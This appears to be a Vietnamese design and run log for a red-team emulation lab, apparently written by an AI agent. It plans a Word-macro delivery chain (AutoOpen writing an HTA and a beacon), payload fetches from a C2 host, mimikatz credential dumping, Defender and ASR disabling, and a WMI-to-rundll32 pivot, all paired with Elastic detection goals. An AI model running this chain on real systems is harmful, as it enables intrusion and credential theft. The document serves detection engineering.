# Initial Access Chain — Design (remote operator, macro-only delivery, WMI→rundll32)

Trạng thái: **DESIGN** (chờ user duyệt access: vmrun creds, Elastic creds, it.admin, station, docm automation).
Run trước tham chiếu: `RUN-20260930-01` (ledger + telemetry: `../../docs/telemetry-comparison-c0015-vs-lab.md`,
`../phase2-operator/operator-phase-context-gaps-runbook.md`).

## 0. Objectives

1. **Operator remote 100%** — không gõ lệnh trên console WS01/FS01. Mọi kỹ thuật operator (S4–S9) được
   điều khiển từ trạm operator (C2 host 192.168.50.1) qua C2-SIM tasking + WMI DCOM (T1047), đúng chất
   "attacker remote".
2. **Delivery chỉ từ file Word macro** — trước khi victim mở `test.docm`, đĩa WS01 KHÔNG có tool nào;
   macro tự sinh config/HTA/beacon; DLL + tools phase-2 đến qua HTTP `:8000` (T1105), không thả thẳng.
3. **G2 — `wmiprvse→rundll32→143.dll`**: diag lại + fix (xem §2 — nghi vấn "ReturnValue=9" là artifact
   quoting chứ không phải window-station).
4. **G1 — Security ingest** vào Elastic (nếu user cấp ES access): mở 4624/4625/4648/4672/5140/5145.
5. **G8 — C2-SIM watchdog** (auto-restart); **G4 — bắt E3 `:8000`** trong verify; G3/G5/G6/G7 cập nhật
   hướng rule theo kết quả mới.

## 1. Phát hiện mới từ điều tra (ảnh hưởng thiết kế)

| # | Phát hiện | Bằng chứng | Hệ quả |
|---|---|---|---|
| N1 | **"ReturnValue=9 cho MỌI DLL" có lỗ hổng chứng minh**: mọi thử nghiệm với-DLL đều qua `wmic` với chuỗi `\"...\"` (escape quote kiểu cmd không hợp lệ → command line bị băm → CreateProcess lỗi path). `rundll32-alone=0` cho thấy rundll32 KHÔNG bị chặn ở session-0 (bản thân nó chạy được). Diag sạch bằng `Invoke-CimMethod` chưa có kết quả ghi trong ledger. | ledger `RUN-20260930-01` S8b notes; diag `user32.dll,MessageBeep`; `pivot_cim.txt`/`pivot_wmic.txt` | Giả thuyết mới: **G2 có thể SOLVED bằng command line sạch (không quote lồng, không wmic qua cmd)** — cần diag matrix §4.2 trước khi kết luận |
| N2 | C2-SIM dừng 03:04:38Z ngay sau `result T-BEACON-SLEEP ok` — **không traceback trong log** (stderr ẩn do `-WindowStyle Hidden`) | `c2sim.log` | Watchdog (G8) không chỉ respawn mà phải ghi stderr; kiểm tra nguyên nhân khi lặp lại |
| N3 | **Residue run cũ**: beacon WS01 (`S1-799c8731a354c9ad`, live) vẫn poll C2-SIM từ 01:09:25 (restart tay) tới giờ; `stage/ws01` còn 143.dll/mimikatz/beacon/config; `build/out` RỖNG | `c2sim.log`, `tasklist` | Trước rerun: cleanup beacon cũ + rebuild payload → `build/out` |
| N4 | WS01 không trả ICMP (firewall) dù VM đang chạy (4 `vmware-vmx`); FS01/DC01/Kali trả ICMP | ping test | Dùng vmrun làm kênh điều hành guest; WS01 cần mở WMI firewall inbound để operator WMI→WS01 (S7b) |
| N5 | `vmrun` có sẵn (VMware Workstation, 4 VM chạy): `E:\VM\C0015\{DC01,WS01,FS01}`, Kali ở OneDrive path | host survey | Preflight + artifact + victim-open đều tự động được qua vmrun (chờ creds) |
| N6 | Elastic 9200/8220 mở từ host (Tailscale); **5601 (Kibana) đóng**; SSH 22 mở (key `elastic01-key.pem`); repo không chứa ES creds (env `ES_USER/ES_PASS` trước đây) | port test | G1 qua Fleet/Kibana API cần tunnel SSH hoặc creds (xem §6) |

## 2. Kiến trúc operator-remote (mới)

### 2.1 Vai trò các kênh

| Kênh | Dùng cho | Không dùng cho |
|---|---|---|
| **C2-SIM tasking** (`/cmd`, `/runbook`, `/results`) | S4/S5 discovery, download tools (S7b/S8a), WMI pivot (S8b), đọc output | — |
| **WMI DCOM** từ C2 host (Invoke-CimMethod, cred it.admin, `-Authentication Dcom`) | Elevate beacon-2 trên WS01 (S7b); logon probes S7 (`4625`/`4624`/`4672` trên FS01) | Không điều hành thường xuyên (tasking đủ) |
| **vmrun** (host→guest) | Preflight 1 lần (Defender/ASR/exclusions, WMI firewall, EnableLUA, icacls, Trust Center), copy docm, mở docm (victim action), artifact pull, cleanup | KHÔNG dùng cho kỹ thuật operator (giữ telemetry sạch) |
| **HTTP `:8000`** (attack infra) | HTA download DLL (S1, đã có); beacon tasking `Invoke-WebRequest` fetch mimikatz/143.dll/beacon2/config-phase7 (S7b/S8a, T1105) | — |

### 2.2 Luồng S4–S9 (Path A — camp-exact, khuyến nghị)

```text
C2 host ──tasking──> beacon-1 (WS01, duc.user)          S4  discovery (runbook 11 lệnh, như cũ)
C2 host ──WMI DCOM (it.admin)──> WS01: wmiprvse→powershell
        = beacon-2 elevated (session-0, re-register SAME token)   S7b  chạy elevated
beacon-2 ──tasking──> download mimikatz (http :8000) ──> E11 + E3 :8000 (G4)
beacon-2 ──tasking──> mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
                       ──> E10 lsass 0x1010 (nguồn = wmiprvse→powershell→mimikatz chain) + output qua /results
beacon-2 ──tasking──> download 143.dll + beacon + config-phase7 (:8000)      S8a
beacon-2 ──tasking──> copy → \\FS01\C$\C0015\            ──> FS01 E11 (+ S5145 nếu G1 xong)
beacon-2 ──tasking──> WMI DCOM → FS01 CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'
                        ──> FS01 wmiprvse→rundll32→143.dll→marker+beacon-3   S8b (T1047 gốc)
beacon-3 (FS01) ──> register phase7-session2 ──> receipt ART-07-01           S9
```

Telemetry kỳ vọng từng bước (bảng chi tiết ở §5.2). Khác biệt so với run cũ: **bỏ hẳn console WS01**
(S0 runas seed, runas mimikatz, runas wmic) — mọi hop đều mạng-native như camp.

### 2.3 Path B (dự phòng, nếu WMI→WS01 bị chặn)

Nếu WS01 chặn WMI inbound (firewall không mở được): nâng beacon-2 bằng **scheduled task**
(`schtasks /create ... /ru it.admin /it`) từ beacon-1 → parent = svchost (Task Scheduler), ghi nhận
G7a; hoặc WMI từ C2 → FS01 trực tiếp (bỏ hop WS01→FS01, ghi PARTIAL cho "pivot từ WS01").

## 3. Delivery redesign — không thả tool thẳng vào máy

### 3.1 S1–S3: macro tự sinh toàn bộ stage

| Trước (run cũ) | Sau (v2) |
|---|---|
| `stage_ws01.ps1` copy config.ini + bootstrap.hta + beacon vào `%PUBLIC%\C0015\` (thả thẳng) | Macro (embedded b64) **tự viết** `config.ini` + `bootstrap.hta` + `c0015_beacon.ps1` vào `%PUBLIC%\C0015\` rồi mshta |
| DLL từ `:8000` lúc runtime | GIỮ NGUYÊN (đã đúng camp: T1105/T1036) |

- Trước khi mở docm: đĩa WS01 chỉ có `test.docm` (+ hệ điều hành).
- Hiện thực: `payloads/packaging/gen_macro_embedded.ps1` — đọc `config.ini` (make_config) + `bootstrap.hta`
  + `c0015_beacon.ps1` → base64 → transform `payloads/docm/macro_payload.vba` → `stage/ws01/macro_embedded.vba`
  (thêm `Sub WriteFiles(): ... ADODB.Stream ...` gọi trước `RunEntry`). VBA module ~15KB — dưới giới hạn.
- `install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba` (giữ nguyên cơ chế COM-inject đã verify).

### 3.2 S7b/S8a: tools qua T1105

- `:8000` publish thêm `tools/` (`mimikatz.exe`, `c0015_143_surrogate.dll`, `c0015_beacon.ps1`,
  `config-phase7.ini` — các file này là attack-infra, không vào đĩa WS01 trước khi beacon-1 có).
- beacon tasking: `powershell -NoProfile -Command "Invoke-WebRequest http://192.168.50.1:8000/tools/<f> -OutFile C:\ProgramData\C0015\<f>"`
  → E11 (FileCreate) + E3 (`:8000`) — đúng dấu hiệu staging T1105, đóng G4.

## 4. Fixes cụ thể (code trong repo)

| Gap | Fix | File |
|---|---|---|
| G8 | Watchdog c2sim: respawn + healthcheck port + ghi stderr | `scripts/c2sim_guard.py` (mới), `payloads/packaging/launch_servers.ps1` (chạy guard thay c2sim trực tiếp; `-Stop` giết guard + con) |
| G2 | Diag matrix (6 variant) trước khi chốt; nếu variant dùng `Invoke-CimMethod`/wmic-sạch trả 0 → **retract "window-station constraint"** trong mọi doc, S8b chuyển sang rundll32 thật | `stage/analysis/wmi_rundll32_diag.ps1` (mới) |
| G4 | verify thêm: E3 `:8000` (S1 DLL + S7b/S8a tool fetches) + kiểm tra index `logs-windows.security-*` | `stage/analysis/verify_run_evidence.py` |
| G1 | Fleet policy `C0015-Windows-Endpoints` thêm input `windows.security` (channel Security) — qua Kibana/Fleet API (tunnel SSH tới ELASTIC01) | tài liệu hóa `../../docs/architecture.md` (viết sau khi có creds) |
| G3 | Giữ rule E10 (0x1010/0x1fffff, nguồn non-system); ghi nguồn mới (wmiprvse chain) | docs update |
| G6/G5 | Rule dùng `process.entity_id` + parent, dedup theo entity | docs update |

## 5. Run procedure v2 (máy cụ thể — sẽ verify sau khi có access)

### 5.0 Cleanup residue (trước P0)

- [C2] `-Action Stop` (giết C2-SIM cũ pid 13852 + http.server) → kiểm tra beacon WS01 cũ còn poll không,
  kill qua vmrun (`listProcessesInGuest` → kill powershell beacon pid).
- [C2] `Remove-Item stage\ws01\*` (bỏ artifact run cũ); `build/out` rebuild.
- [VS01/FS01] xoá `C:\C0015`, `C:\Tools\mimikatz.exe`, `C:\stage` (còn lại run cũ).

### 5.1 P0 — preflight (1 lần, tự động qua vmrun + vài gate tay)

| Máy | Bước | Kênh |
|---|---|---|
| C2 | `preflight_vmrun.ps1` khởi tạo cred file (DPAPI clixml, gitignored) | tay 1 lần |
| Kali | build DLL (`build_dll.sh` + 143.dll) hoặc copy binary sẵn có; `john` (có sẵn) | SSH/vmrun |
| WS01 | it.admin ∈ Administrators; EnableLUA=0 + reboot (vmrun reset); **WMI firewall inbound mở** (mới — cho S7b); Defender: Tamper OFF → ASR `d1e49aac` OFF + RTM off + exclusions; Trust Center Word: `VBAWarnings=1`, `AccessVBOM=1`, ProtectedView off | vmrun (admin) |
| FS01 | it.admin ∈ Administrators; WMI firewall mở (đã có); `icacls C:\C0015 Everyone:F`; Defender như trên | vmrun |
| C2/WS01/FS01 | Elastic agent healthy (check Fleet) | ES API |

### 5.2 P1 — entry (victim action duy nhất)

1. [C2] `-Action Pre` (server UP, sinh config + embedded vba; kiểm tra LISTENER 2 port).
2. [WS01] (vmrun, duc.user) `install_macro_docm.ps1 -MacroSource macro_embedded.vba` → Desktop/test.docm.
3. [WS01] (vmrun, duc.user) `cmd /c start test.docm` → macro chạy → S1–S3 (macros enabled qua Trust Center;
   không cần bấm Enable Content — ghi chú lab-config).
4. [C2] `-Action WaitSession` → `-Action P1`.

Telemetry kỳ vọng S1–S3 (không đổi): E1 `WINWORD→mshta→regsvr32` + E3 `:8000` (DLL) + E1 beacon + E3 `:8080`.

### 5.3 P2 — operator remote

| # | Bước | Lệnh / kênh | Evidence kỳ vọng |
|---|---|---|---|
| 1 | S4 discovery | C2 `-Action P2` (runbook c0015-phase2) | E1 con beacon (WS01) |
| 2 | S5 share | `-Action Run -Body 'net view \\FS01'` + Get-SmbShare | E1 + E11 found_shares (WS01) |
| 3 | S7 logon probes (Path A) | C2 `Invoke-CimMethod -ComputerName FS01 -Credential duc.user(wrong)` → fail; `-Credential it.admin` → ok | FS01 **S4625** (460, 424) nếu G1; nếu muốn S4648: giữ 1 bước interactive `net use B` (xem §7 Q4) |
| 4 | S7b elevate beacon-2 | C2 `Invoke-CimMethod -ComputerName WS01 -Credential it.admin` CommandLine=`powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\C0015\c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini` | WS01 E1 **wmiprvse→powershell** (elevated, re-register token) + FS01 4624 khi hop sau |
| 5 | S7b mimikatz | beacon-2 tasking: download+mimikatz `"privilege::debug" "sekurlsa::logonpasswords" "exit"` → đọc `/results` → crack (john) / provisioned | WS01 E11 mimikatz + **E10 lsass 0x1010 nguồn non-system** + E3 `:8000` |
| 6 | S8a handoff | beacon-2 tasking: download 143.dll+beacon+config-phase7 → `copy` → `\\FS01\C$\C0015\` | WS01 E11 + FS01 E11 (+ S5145 nếu G1) |
| 7 | S8b WMI pivot | beacon-2 tasking: `New-CimSession -ComputerName FS01 -Authentication Dcom; Invoke-CimMethod ... CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'` (xem diag §4.2 trước) | **FS01 E1 wmiprvse→rundll32** + E7 143.dll hash=ART-06-01 + E11 marker + 4624 T3 |
| 8 | S9 session-2 | beacon-3 register phase7-session2 | receipt **ART-07-01-<token>** + E3 FS01→:8080 |

### 5.4 Q — verify + cleanup

- Elastic: `verify_run_evidence.py` (bản v2: thêm :8000 + security) → `run-window-evidence.md`.
- Cleanup: beacon kill (vmrun), `-Action Stop`, bật lại Defender/ASR/firewall, xoá C:\C0015/C:\Tools/stage.

## 6. G1 — Security ingest (chi tiết, chờ creds)

1. Tunnel: `ssh -i elastic01-key.pem <user>@100.77.46.126 -L 5601:localhost:5601` (xác định user SSH).
2. Fleet API: `GET /api/fleet/agent_policies?kuery=names:"C0015-Windows-Endpoints"` → `POST /api/fleet/package_policies`
   (package `windows`, input eventlog, dataset `windows.security`, channel `Security`, namespace `c0015`).
3. Chờ agent reload (vài phút) → verify `GET .ds-logs-windows.security-*/_search` có 4624/4625/4672/5145.
4. Cập nhật `verify_run_evidence.py` query theo index mới; join `winlog.logon.id` (4624) ↔ E10/E1 nếu cần.

## 7. Open items — cần user quyết (đi kèm câu hỏi)

| Q | Vấn đề | Lựa chọn đề xuất |
|---|---|---|
| Q1 | vmrun cần guest creds (user/pass trên command line — lab-only) | Tạo user `C0015\labops` admin (WS01/FS01) + local labops (DC01/Kali) — pass lab-only, gitignored; hoặc dùng creds có sẵn |
| Q2 | Elastic: `ES_USER/ES_PASS` (+ SSH user cho key) | Cấp để tôi verify + làm G1 (Fleet API) |
| Q3 | it.admin password dùng cho S7/S8 | Cấp (lab) — dùng qua DPAPI clixml, KHÔNG vào repo/cmdline telemetry; S7 interactive tuỳ chọn |
| Q4 | Station/diag: Path A (khuyến nghị) vs B; docm mở tự động (vmrun) vs tay | Path A + vmrun open |

## 8. Rule pointers (cập nhật dự kiến sau rerun)

- S8b: nếu G2 retract → rule `E1 parent=wmiprvse & child=rundll32 & E7 unsigned-DLL` sống lại (đúng camp);
  giữ fallback behavior-rule (E7+E3) cho loader-host (G7).
- S7b: rule E10 lsass (0x1010/0x1fffff, non-system) — nguồn mới là chain wmiprvse→powershell→mimikatz.
- S7/S8a: khi G1 xong → rule S4624 T3 it.admin→FS01 + S5145 C$ write + join LogonId.
- G5/G6: mọi count-rule gắn `process.entity_id` (dedup), không raw count.
## 9. Điều tra mục tiêu #3 — macro self-write files (2026-10-02, kết quả)

**Mục tiêu**: trước khi victim mở file, WS01 không có tool — macro trong test.docm tự viết config.ini + bootstrap.hta + c0015_beacon.ps1 (base64 nhúng VBA) vào %PUBLIC%\C0015.

**Phương pháp**: dựng 3 docm chẩn đoán (diag1 COM / diag2 chunked-const / diag3 native-I/O Open/Put) mở qua scheduled-task interactive; test clean-slate (xoá seed → mở test.docm thật).

**Kết quả (verified Elastic + guest + Application log)**:
- Word qua VIX (vmrun) → KHÔNG bao giờ chạy macro (0 event kể cả native-I/O).
- Word qua scheduled-task interactive → chạy lúc được, lúc không (E1 WINWORD→mshta thấy ở 02:25/03:20/03:45/03:53; d6 03:56 mở mà 0 action). Macro execution **phụ thuộc instance Word** — lỗi không nằm ở code WriteFiles.
- Application log không có lỗi Word (không crash/dialog được log); VBAWarnings/AccessVBOM/ProtectedView đều đã set.
- d5 (test.docm + pub wiped) → beacon register 03:53:36 — gợi ý WriteFiles có thể chạy ở clean-slate nhưng chưa tái lập ổn định.
- diag3 native I/O cũng 0 output ở instance không chạy ⇒ vấn đề ở tầng "macro có chạy không", không phải write-code.

**Kết luận**: mode tin cậy hiện tại = seed fallback (đã chứng minh nhiều lần). Để "entry 100% từ macro": cần quan sát console UI của Word trong session duc.user (bắt dialog ẩn/first-run) hoặc dùng manual open; WriteFiles code đã được viết lại hướng native-I/O (chống COM-fail) sẵn sàng re-validate.

## 10. Goal #3 — docm TỰ SINH HẾT PAYLOAD TỪ ĐẦU: SOLVED (2026-10-02, verified)

RUN chứng minh 05:05Z: mở c0015_goal3.docm (manual victim-open, auto-macro) →
macro (AutoOpen, standard module) tự viết config.ini(1734)/bootstrap.hta(4358)/c0015_beacon.ps1(6093)
(E11 proc=WINWORD) → mshta chạy HTA → download c0015-comparefor.jpg(90407) → regsvr32 → dll-executed →
beacon register phase3 (token a7d4f6e1, ok=True). c0015wf.log ghi từng bước WriteFiles err=0.

4 root cause đã sửa (commit 422ed91):
1. installer dùng `$doc.VBProject` thay `$word.VBE.ActiveVBProject` (trước: project rơi vào Normal.dotm →
   docm lưu KHÔNG macro);
2. inject vào STANDARD MODULE 'c0015Payload' (ThisDocument derive Document → collision member → "member
   already exists");
3. module emission viết lại sạch từ generator (hết junk sau End Sub; sửa `sh.Run` quote-soup → `sh.Run
   mshtaPath & " " & htaPath, 0, False`);
4. trigger = `Public Sub AutoOpen()` duy nhất (standard module).

Điều kiện lab cần nhớ: victim-open MANUAL (Word session interactive), Word sạch (xoá Resiliency/DocumentRecovery
sau crash trước khi mở), auto-macro bật. Ghi chú: đôi khi mshta hiện "script error: write to file failed
(code 0)" thoáng qua ở bước ghi marker nhưng file vẫn ghi thành công (E11 xác nhận) - script tiếp tục chạy.



